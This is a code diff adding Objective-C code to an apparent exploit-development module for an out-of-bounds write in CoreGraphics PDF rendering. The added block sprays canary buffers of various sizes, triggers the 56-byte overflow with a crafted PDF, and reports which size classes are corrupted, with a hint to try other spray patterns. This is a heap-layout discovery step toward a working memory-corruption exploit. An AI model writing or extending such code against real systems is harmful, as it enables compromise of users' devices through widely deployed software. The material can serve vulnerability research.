@@ -200,6 +200,54 @@
      @"(values 1.0..7.0) and a hardware-watchpoint hit for R=6 â€” this module\n"
      @"repeats those conditions with an independent generator.\n"];
         // PID scan: check if OOB write affected any canary-like data
+        // Size discovery: allocate canary objects of various sizes, trigger OOB, check corruption
+        [report appendString:@"\n--- CG buffer size discovery ---\n"];
+        {
+            uint32_t sizes[] = {64, 128, 192, 256, 320, 384, 448, 512, 576, 640, 768, 1024, 2048};
+            int nsizes = sizeof(sizes) / sizeof(sizes[0]);
+            NSMutableArray *canaries = [NSMutableArray array];
+            NSMutableIndexSet *corrupted = [NSMutableIndexSet indexSet];
+
+            // Allocate canary objects with recognizable patterns
+            for (int s = 0; s < nsizes; s++) {
+                NSMutableData *d = [NSMutableData dataWithLength:sizes[s]];
+                uint8_t *p = (uint8_t *)d.mutableBytes;
+                for (size_t j = 0; j < sizes[s]; j++) {
+                    p[j] = (uint8_t)(0xA0 + s); // unique pattern per size
+                }
+                [canaries addObject:d];
+            }
+
+            // Trigger CG PDF OOB write (R=12, 56-byte overflow)
+            NSData *pdf = [self buildPDFWithFunctionCount:12 rows:2];
+            [self renderPDFData:pdf name:@"kp-pdf-sizediscovery"];
+
+            // Check for corruption
+            for (int s = 0; s < nsizes; s++) {
+                NSMutableData *d = canaries[s];
+                uint8_t *p = (uint8_t *)d.mutableBytes;
+                for (size_t j = 0; j < sizes[s]; j++) {
+                    if (p[j] != (uint8_t)(0xA0 + s)) {
+                        [corrupted addIndex:s];
+                        [report appendFormat:@"CORRUPTED size=%u at +0x%zx: 0x%02x -> 0x%02x\n",
+                         sizes[s], j, (uint8_t)(0xA0 + s), p[j]];
+                        break;
+                    }
+                }
+            }
+
+            if (corrupted.count > 0) {
+                [report appendFormat:@"*** CG BUFFER ADJACENT SIZES: %lu corrupted ***\n",
+                 (unsigned long)corrupted.count];
+                [corrupted enumerateIndexesUsingBlock:^(NSUInteger idx, BOOL *stop) {
+                    [report appendFormat:@"  -> %u bytes\n", sizes[idx]];
+                }];
+            } else {
+                [report appendString:@"No canary corruption — CG buffer not adjacent to our objects.\n"];
+                [report appendString:@"Try: different spray patterns or larger R value.\n"];
+            }
+        }
+
         [report appendString:@"\n--- PID scan after OOB write ---\n"];
         int myPID = getpid();
         [report appendFormat:@"our pid=%d\n", myPID];
